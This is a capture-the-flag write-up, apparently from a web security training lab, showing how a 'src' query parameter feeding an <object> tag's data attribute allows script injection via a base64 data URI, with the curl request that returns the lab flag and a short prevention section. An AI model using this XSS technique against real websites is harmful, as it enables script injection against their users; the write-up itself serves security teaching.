# Description

If we look closely in the home page there is only one image that is a link, the picture of the nsa.

Once we click we got ridrected to `/?page=media&src=nsa`

Inspecting the page we see that the image is displayed not by a <img> but by a <object> tag :
<object data="http://10.14.59.83/images/nsa_prism.jpg"></object>

I noticed that the field src control what the data on the object tag.

So our goal is the change the data displayed by object.

# Attack

We will try to inject javascript throught objet data by using base64 data type.

```bash
*[main][~/projects/darkly]$ echo -n "<script>alert(1)</script>" | base64
PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
*[main][~/projects/darkly]$ 
```
It would look like this when we send the GET request to server
```html
<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>
```

Now we put in the data section then we send it
```bash
*[main][~/projects/darkly]$ curl "http://10.14.59.83/?page=media&src='data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='"|grep flag   
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  2123    0  2123    0     0  2843k      0 --:--:-- --:--:-- --:--:-- 2073k
<center><h2 style="margin-top:50px;"> The flag is : 928d819fc19405ae09921a2b71227bd9aba106f9d2d37ac412e9e5a750f1506d</h2><br/><img src="images/win.png" alt="" width=200px height=200px></center><table style="margin-top:-68px;"></table>	</div>
*[main][~/projects/darkly]$ 
```

# Preventions:

- *Input Validation:** Always validate and sanitize user inputs, especially those used to construct URLs or interact with external resources. Ensure inputs adhere to expected formats and content.

- **Whitelist Allowed Sources:** Maintain a list of trusted sources or URLs that your application can access. Validate incoming requests against this list to prevent unauthorized access to external resources.

- **User Data Handling:** Never use user-provided data directly in URLs or attributes. Generate URL values on the server-side using validated and safe data to prevent manipulation.
